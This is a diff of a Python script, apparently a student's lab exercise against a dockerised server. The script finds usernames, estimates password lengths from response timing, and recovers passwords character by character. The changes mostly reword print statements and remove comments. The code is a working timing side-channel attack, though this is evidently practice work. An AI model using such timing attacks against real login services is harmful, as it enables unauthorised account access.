@@ -110,11 +110,11 @@ def find_password_length_2(username_list):
     for student_number in username_list:
         time_length[student_number] = []
         password = ""
-        for length in range(1, 11):  # Assuming you want to test up to 10 characters
+        for length in range(1, 11):
             password = "a" * length
 
             duration_list = []
-            for _ in range(50):  # Reduced number of calls for efficiency
+            for _ in range(50):
                 start_time = time.perf_counter()
                 call_server(student_number, password)
                 end_time = time.perf_counter()
@@ -223,6 +223,7 @@ def find_password(stu_length_dict):
 
             # Set that character on the index, to guess the next number
             guess_list[x] = character 
+            print("Character = ", character)
 
         passwords[stu_number] = ''.join(guess_list)
 
@@ -233,19 +234,17 @@ def main():
     # Find all valid student numbers
     # On the doker image there is only one username being 000000, therefore for testing I am only giving it a range of 10
     username_list = find_username(0, 10)
-    print(username_list)
+    print("Found usernames are: ", username_list)
 
     # Find for each valid student their password length
     stu_number_and_length_dict = (find_password_length_2(username_list))
-    print(stu_number_and_length_dict)
+    print("Student numbers anbd password length are: ", stu_number_and_length_dict)
 
     stu_number_and_password_dict = find_password(stu_number_and_length_dict)
-    print(stu_number_and_password_dict)
+    print("Found student numbers and corresponding passwords: ", stu_number_and_password_dict)
     
     for student_number, password in stu_number_and_password_dict.items():
         print(call_server(student_number, password))
-
-    #print(call_server("000000", "hunter2"))
 
 
 if __name__ == "__main__":
